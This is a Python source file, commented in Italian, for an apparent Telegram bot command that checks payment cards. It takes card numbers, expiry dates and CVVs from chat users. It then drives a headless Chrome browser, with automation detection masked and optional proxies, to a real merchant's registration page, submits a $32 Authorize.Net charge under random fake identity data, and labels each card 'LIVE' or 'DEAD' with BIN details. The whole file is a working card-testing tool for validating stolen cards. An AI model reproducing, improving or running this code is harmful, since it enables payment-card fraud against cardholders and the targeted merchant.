import re
import logging
import random
import string
import time
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.options import Options
from selenium.common.exceptions import TimeoutException, NoSuchElementException
from telegram import Update
from telegram.ext import ContextTypes

from card_parser import parse_card_input
from security import is_allowed_chat, get_chat_permissions, can_use_command
from api_client import api_client

logger = logging.getLogger(__name__)

class AuthNetCheckoutAutomation:
    def __init__(self, headless=True, proxy_url=None):
        self.driver = None
        self.wait = None
        self.headless = headless
        self.proxy_url = proxy_url
    
    def setup_driver(self):
        """Inizializza il driver selenium"""
        try:
            chrome_options = Options()
            
            if self.headless:
                chrome_options.add_argument("--headless")
            
            chrome_options.add_argument("--no-sandbox")
            chrome_options.add_argument("--disable-dev-shm-usage")
            chrome_options.add_argument("--disable-blink-features=AutomationControlled")
            chrome_options.add_experimental_option("excludeSwitches", ["enable-automation"])
            chrome_options.add_experimental_option('useAutomationExtension', False)
            
            chrome_options.add_argument("--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
            chrome_options.add_argument("--window-size=1920,1080")
            
            if self.proxy_url:
                chrome_options.add_argument(f'--proxy-server={self.proxy_url}')
            
            self.driver = webdriver.Chrome(options=chrome_options)
            self.driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
            
            self.wait = WebDriverWait(self.driver, 20)
            logger.info("✅ Driver AuthNet inizializzato")
            return True
        except Exception as e:
            logger.error(f"❌ Errore inizializzazione driver: {e}")
            return False

    def fill_registration_form(self, card_data):
        """Compila il form di registrazione AuthNet"""
        try:
            print("📝 Compilo form registrazione...")
            
            # Genera dati casuali
            username = ''.join(random.choices(string.ascii_lowercase, k=8))
            email = f"test{random.randint(1000,9999)}@gmail.com"
            password = "TestPassword123!"
            
            # USERNAME
            username_selectors = ["#user_login", "input[name='user_login']"]
            for selector in username_selectors:
                try:
                    field = self.driver.find_element(By.CSS_SELECTOR, selector)
                    field.clear()
                    field.send_keys(username)
                    print("✅ Username compilato")
                    break
                except:
                    continue
            
            # EMAIL
            email_selectors = ["#user_email", "input[name='user_email']"]
            for selector in email_selectors:
                try:
                    field = self.driver.find_element(By.CSS_SELECTOR, selector)
                    field.clear()
                    field.send_keys(email)
                    print("✅ Email compilata")
                    break
                except:
                    continue
            
            # PASSWORD
            password_selectors = ["#user_pass", "input[name='user_pass']"]
            for selector in password_selectors:
                try:
                    field = self.driver.find_element(By.CSS_SELECTOR, selector)
                    field.clear()
                    field.send_keys(password)
                    print("✅ Password compilata")
                    break
                except:
                    continue
            
            # FIRST NAME (campo obbligatorio)
            try:
                first_name_selectors = ["input[name='first_name']", "input[name='fname']"]
                for selector in first_name_selectors:
                    try:
                        field = self.driver.find_element(By.CSS_SELECTOR, selector)
                        field.clear()
                        field.send_keys("Test")
                        print("✅ First name compilato")
                        break
                    except:
                        continue
            except:
                print("⚠️ First name non trovato")
            
            # LAST NAME (campo obbligatorio)
            try:
                last_name_selectors = ["input[name='last_name']", "input[name='lname']"]
                for selector in last_name_selectors:
                    try:
                        field = self.driver.find_element(By.CSS_SELECTOR, selector)
                        field.clear()
                        field.send_keys("User")
                        print("✅ Last name compilato")
                        break
                    except:
                        continue
            except:
                print("⚠️ Last name non trovato")
            
            # CARD NUMBER
            card_selectors = [
                "input[name='authorize_net[card_number]']",
                "input[data-authorize-net='card-number']",
                "input[placeholder*='Card']"
            ]
            for selector in card_selectors:
                try:
                    field = self.driver.find_element(By.CSS_SELECTOR, selector)
                    field.clear()
                    # Simula digitazione umana
                    for char in card_data['number']:
                        field.send_keys(char)
                        time.sleep(0.05)
                    print("✅ Card number compilato")
                    break
                except:
                    continue
            
            # EXPIRY MONTH
            month_selectors = [
                "select[name='authorize_net[exp_month]']",
                "input[name='authorize_net[exp_month]']",
                "select[name='exp_month']"
            ]
            for selector in month_selectors:
                try:
                    field = self.driver.find_element(By.CSS_SELECTOR, selector)
                    if field.tag_name == 'select':
                        from selenium.webdriver.support.ui import Select
                        select = Select(field)
                        select.select_by_value(card_data['month'])
                    else:
                        field.clear()
                        field.send_keys(card_data['month'])
                    print("✅ Mese compilato")
                    break
                except:
                    continue
            
            # EXPIRY YEAR
            year_selectors = [
                "select[name='authorize_net[exp_year]']",
                "input[name='authorize_net[exp_year]']", 
                "select[name='exp_year']"
            ]
            for selector in year_selectors:
                try:
                    field = self.driver.find_element(By.CSS_SELECTOR, selector)
                    if field.tag_name == 'select':
                        from selenium.webdriver.support.ui import Select
                        select = Select(field)
                        select.select_by_value(card_data['year'])
                    else:
                        field.clear()
                        field.send_keys(card_data['year'])
                    print("✅ Anno compilato")
                    break
                except:
                    continue
            
            # CVV
            cvv_selectors = [
                "input[name='authorize_net[cvc]']",
                "input[name='cvc']",
                "input[placeholder*='CVV']"
            ]
            for selector in cvv_selectors:
                try:
                    field = self.driver.find_element(By.CSS_SELECTOR, selector)
                    field.clear()
                    field.send_keys(card_data['cvv'])
                    print("✅ CVV compilato")
                    break
                except:
                    continue
            
            # TERMS CHECKBOX
            try:
                terms_selectors = [
                    "input[name='terms']",
                    "input[type='checkbox'][name*='terms']"
                ]
                for selector in terms_selectors:
                    try:
                        checkbox = self.driver.find_element(By.CSS_SELECTOR, selector)
                        if not checkbox.is_selected():
                            self.driver.execute_script("arguments[0].click();", checkbox)
                            print("✅ Terms checkbox selezionato")
                            break
                    except:
                        continue
            except:
                print("⚠️ Terms checkbox non trovato")
            
            time.sleep(2)
            return True
            
        except Exception as e:
            print(f"❌ Errore compilazione form: {e}")
            return False

    def submit_form(self):
        """Invia il form"""
        try:
            print("🚀 Invio form...")
            
            submit_selectors = [
                "button[type='submit']",
                "input[type='submit']",
                ".arm_form_submit_btn",
                ".btn-primary",
                "button[name='submit']"
            ]
            
            for selector in submit_selectors:
                try:
                    buttons = self.driver.find_elements(By.CSS_SELECTOR, selector)
                    for btn in buttons:
                        if btn.is_displayed() and btn.is_enabled():
                            self.driver.execute_script("arguments[0].scrollIntoView(true);", btn)
                            time.sleep(1)
                            self.driver.execute_script("arguments[0].click();", btn)
                            print("✅ Form inviato")
                            return True
                except:
                    continue
            
            print("❌ Bottone submit non trovato")
            return False
            
        except Exception as e:
            print(f"❌ Errore invio form: {e}")
            return False

    def analyze_result(self):
        """Analizza risultato AuthNet - VERSIONE CORRETTA che evita falsi positivi"""
        print("🔍 Analisi risultato AuthNet...")
        
        try:
            current_url = self.driver.current_url.lower()
            page_text = self.driver.page_source.lower()
            page_title = self.driver.title.lower()
            
            print(f"📄 Final URL: {current_url}")
            print(f"📄 Page title: {page_title}")
            
            # 1. PRIMA CONTROLLA SE C'È UN MESSAGGIO DI SUCCESSO CHIARO
            success_indicators = [
                'thank you',
                'welcome',
                'success',
                'registration complete', 
                'payment successful',
                'congratulations',
                'your account has been created',
                'membership activated'
            ]
            
            for indicator in success_indicators:
                if indicator in page_text:
                    print(f"✅ APPROVED - Messaggio successo: {indicator}")
                    return "APPROVED", f"Card LIVE - {indicator}"
        
            # 2. CONTROLLA URL DI SUCCESSO
            if any(url in current_url for url in ['my-account', 'dashboard', 'thank-you', 'success']):
                print("✅ APPROVED - Redirect a pagina successo")
                return "APPROVED", "Card LIVE - Payment successful"
            
            # 3. SE SIAMO SU UNA PAGINA DIVERSA DA REGISTER
            if 'tempestprotraining.com' in current_url and 'register' not in current_url:
                print("✅ APPROVED - Reindirizzamento a pagina diversa")
                return "APPROVED", "Card LIVE - Redirect successful"
            
            # 4. SE SIAMO ANCORA SU REGISTER, CERCHIAMO SOLO ERRORI SPECIFICI DELLA CARTA
            if 'register' in current_url:
                print("🔄 Analisi errori specifici carta...")
                
                # CERCA SOLO ERRORI RELATIVI ALLA CARTA (non errori generici del form)
                card_specific_errors = [
                    'your card was declined',
                    'card was declined',
                    'declined',
                    'invalid card number',
                    'invalid card',
                    'card number is invalid',
                    'invalid expiration',
                    'invalid security code',
                    'cvv is invalid',
                    'payment failed',
                    'transaction declined',
                    'do not honor',
                    'insufficient funds'
                ]
                
                # Cerca nei messaggi di errore visibili
                try:
                    error_elements = self.driver.find_elements(By.CSS_SELECTOR, ".error, .field-error, .notice-error, .alert-danger, [class*='error']")
                    for element in error_elements:
                        if element.is_displayed():
                            error_text = element.text.lower()
                            print(f"🔍 Trovato elemento errore: {error_text[:100]}...")
                            
                            # CONTROLLA SOLO SE L'ERRORE È RELATIVO ALLA CARTA
                            if any(card_error in error_text for card_error in card_specific_errors):
                                print(f"❌ DECLINED - Errore carta specifico: {error_text[:100]}")
                                return "DECLINED", f"Card DEAD - {error_text[:100]}"
                            else:
                                print(f"⚠️ Ignoro errore non relativo a carta: {error_text[:100]}")
                except Exception as e:
                    print(f"⚠️ Errore ricerca elementi: {e}")
                
                # Cerca nei messaggi di testo generale della pagina
                for card_error in card_specific_errors:
                    if card_error in page_text:
                        print(f"❌ DECLINED - Messaggio errore carta: {card_error}")
                        return "DECLINED", f"Card DEAD - {card_error}"
                
                # 5. CONTROLLA SE I CAMPI CARTA HANNO ERRORI VISIVI SPECIFICI
                try:
                    card_field_selectors = [
                        "input[name*='card_number']",
                        "input[name*='number']",
                        "input[name*='cvc']",
                        "input[name*='expiry']",
                        "input[name*='exp_month']",
                        "input[name*='exp_year']"
                    ]
                    
                    for selector in card_field_selectors:
                        try:
                            fields = self.driver.find_elements(By.CSS_SELECTOR, selector)
                            for field in fields:
                                # Controlla se il campo carta ha stili di errore
                                field_class = field.get_attribute('class') or ''
                                field_style = field.get_attribute('style') or ''
                                parent = field.find_element(By.XPATH, "./..")
                                parent_class = parent.get_attribute('class') or ''
                                
                                has_error = (
                                    'error' in field_class.lower() or 
                                    'error' in parent_class.lower() or
                                    'invalid' in field_class.lower() or
                                    'invalid' in parent_class.lower() or
                                    'red' in field_style.lower() or
                                    'border' in field_style.lower() and 'red' in field_style.lower()
                                )
                                
                                if has_error and field.is_displayed():
                                    print(f"❌ DECLINED - Campo carta con errore visivo: {selector}")
                                    return "DECLINED", "Card validation failed - field errors"
                        except:
                            continue
                except Exception as e:
                    print(f"⚠️ Errore controllo campi carta: {e}")
                
                # 6. SE SIAMO ANCORA QUI E ANCORA SU REGISTER, VERIFICA SE IL FORM È STATO INVIATO
                # Controlla se ci sono campi obbligatori vuoti (first name, last name)
                try:
                    required_fields = self.driver.find_elements(By.CSS_SELECTOR, "input[required]")
                    empty_required = []
                    for field in required_fields:
                        if field.get_attribute('value') in ['', None]:
                            field_name = field.get_attribute('name') or field.get_attribute('id') or 'unknown'
                            empty_required.append(field_name)
                    
                    if empty_required and len(empty_required) > 2:  # Se più di 2 campi obbligatori sono vuoti
                        print(f"⚠️ Campi obbligatori vuoti: {empty_required}")
                        print("🔄 Probabile problema di compilazione form, non errore carta")
                        return "ERROR", f"Form incomplete - missing fields: {', '.join(empty_required[:3])}"
                except:
                    pass
                
                # 7. ULTIMO CONTROLLO: SE NESSUN ERRORE SPECIFICO CARTA, ALLORA È UN PROBLEMA DI COMPILAZIONE
                print("⚠️ Ancora su register ma nessun errore specifico della carta trovato")
                return "ERROR", "Payment processing incomplete - no card-specific errors found"
            
            # 8. SE NON SIAMO SICURI, ERROR
            print("⚠️ Risultato incerto - situazione non prevista")
            return "ERROR", "Unable to determine card status - unusual situation"
            
        except Exception as e:
            print(f"💥 Errore analisi: {e}")
            return "ERROR", f"Analysis error - {str(e)}"

    def process_payment(self, card_data):
        """Processa pagamento AuthNet"""
        try:
            print("🚀 INIZIO PROCESSO AUTHNET $32")
            
            if not self.setup_driver():
                return "ERROR", "Driver initialization failed"
            
            # Vai alla pagina di registrazione
            print("🔄 Accesso a AuthNet...")
            self.driver.get("https://tempestprotraining.com/register/")
            time.sleep(7)
            
            # Compila il form
            if not self.fill_registration_form(card_data):
                return "ERROR", "Form filling failed"
            
            # Invia il form
            if not self.submit_form():
                return "ERROR", "Form submission failed"
            
            # Aspetta il processing
            print("🔄 Processing payment...")
            time.sleep(15)
            
            # Analizza il risultato
            status, message = self.analyze_result()
            return status, message
            
        except Exception as e:
            print(f"💥 Errore: {e}")
            return "ERROR", f"Processing error - {str(e)}"
        finally:
            if self.driver:
                self.driver.quit()

def process_authnet_payment(card_number, month, year, cvv, headless=True, proxy_url=None):
    processor = AuthNetCheckoutAutomation(headless=headless, proxy_url=proxy_url)
    card_data = {
        'number': card_number,
        'month': month,
        'year': year,
        'cvv': cvv
    }
    return processor.process_payment(card_data)

async def authnet_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Check card with AuthNet - VERSIONE CHE VERIFICA STATO CARTA"""
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id
    chat_type = update.effective_chat.type
    
    if not is_allowed_chat(chat_id, chat_type, user_id):
        permission_info = get_chat_permissions(chat_id, chat_type, user_id)
        await update.message.reply_text(f"❌ {permission_info}")
        return
    
    can_use, error_msg = can_use_command(user_id, 'au')
    if not can_use:
        await update.message.reply_text(error_msg)
        return
    
    if not context.args:
        await update.message.reply_text("Usage: /au number|month|year|cvv [proxy]")
        return
    
    full_input = ' '.join(context.args)
    proxy_match = re.search(r'(https?://[^\s]+)', full_input)
    proxy_url = proxy_match.group(0) if proxy_match else None
    
    if proxy_url:
        card_input = full_input.replace(proxy_url, '').strip()
    else:
        card_input = full_input
    
    card_input = re.sub(r'\s+', ' ', card_input).strip()
    
    wait_message = await update.message.reply_text("🔄 Checking AuthNet...")
    
    try:
        parsed_card = parse_card_input(card_input)
        
        if not parsed_card['valid']:
            await wait_message.edit_text(f"❌ Invalid card: {parsed_card['error']}")
            return
        
        bin_number = parsed_card['number'][:6]
        bin_result = api_client.bin_lookup(bin_number)
        
        status, message = process_authnet_payment(
            parsed_card['number'],
            parsed_card['month'],
            parsed_card['year'],
            parsed_card['cvv'],
            proxy_url=proxy_url
        )
        
        if status == "APPROVED":
            response = f"""✅ *CARD LIVE* ✅

*Card:* `{parsed_card['number']}|{parsed_card['month']}|{parsed_card['year']}|{parsed_card['cvv']}`
*Gateway:* AuthNet $32
*Status:* CARTA VIVA
*Response:* {message}"""
    
        elif status == "DECLINED":
            response = f"""❌ *CARD DEAD* ❌

*Card:* `{parsed_card['number']}|{parsed_card['month']}|{parsed_card['year']}|{parsed_card['cvv']}`
*Gateway:* AuthNet $32
*Status:* CARTA MORTA
*Response:* {message}"""
    
        else:
            response = f"""⚠️ *STATUS SCONOSCIUTO* ⚠️

*Card:* `{parsed_card['number']}|{parsed_card['month']}|{parsed_card['year']}|{parsed_card['cvv']}`
*Gateway:* AuthNet $32
*Status:* NON DETERMINATO
*Response:* {message}"""
        
        if bin_result and bin_result['success']:
            bin_data = bin_result['data']
            response += f"""

*BIN Info:*
*Country:* {bin_data.get('country', 'N/A')}
*Issuer:* {bin_data.get('issuer', 'N/A')}
*Scheme:* {bin_data.get('scheme', 'N/A')}
*Type:* {bin_data.get('type', 'N/A')}
*Tier:* {bin_data.get('tier', 'N/A')}"""
        
        await wait_message.edit_text(response, parse_mode='Markdown')
        
    except Exception as e:
        logger.error(f"❌ Error in authnet_command: {e}")
        await wait_message.edit_text(f"❌ Error: {str(e)}")
